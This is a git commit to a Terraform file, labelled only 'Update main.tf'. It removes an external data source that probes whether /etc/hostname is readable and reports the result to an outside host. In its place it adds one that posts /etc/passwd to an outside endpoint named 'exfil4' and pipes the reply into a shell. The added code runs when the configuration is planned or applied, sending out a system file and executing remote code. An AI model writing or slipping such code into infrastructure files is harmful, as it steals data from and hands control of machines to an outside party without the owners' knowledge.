72175002be11c998ef67a5fbd6177e0ebcb7baa5
snehak7-cyber <snehakkaran.7@gmail.com>
2026-09-07 15:11:33 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,11 +1,4 @@
-data "external" "file_read_test" {
-  program = [
-    "sh",
-    "-c",
-    "if test -r /etc/hostname; then curl -s -X POST --data 'file-readable=true' https://hk58dbow4jlj1u10l8jovrcrfilc97xw.net-spi.com >/dev/null 2>&1; echo '{\"result\":\"readable-callback-sent\"}'; else echo '{\"result\":\"not-readable\"}'; fi"
-  ]
-}
-
-output "file_read_test" {
-  value = data.external.file_read_test.result
+data "external" "example" {
+ program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd
+https://cwc3p60rgexedpdvx3vj7momrdx7l49t.net-spi.com/exfil4 | sh"]
 }
